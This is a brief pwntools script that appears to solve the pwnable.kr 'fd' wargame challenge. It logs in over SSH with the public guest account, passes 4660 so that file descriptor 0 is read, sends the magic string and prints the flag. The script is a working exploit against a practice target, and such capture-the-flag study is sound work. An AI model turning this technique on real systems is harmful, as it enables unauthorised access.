from pwn import *


context(arch='amd64', os='linux', log_level='error')

sh = ssh('fd', 'pwnable.kr', password='guest', port=2222)
# Make fd STDIN
p = sh.process(['fd','4660'])
# Read flag file
p.sendline(b'flag')
flag = p.recv()
print(flag)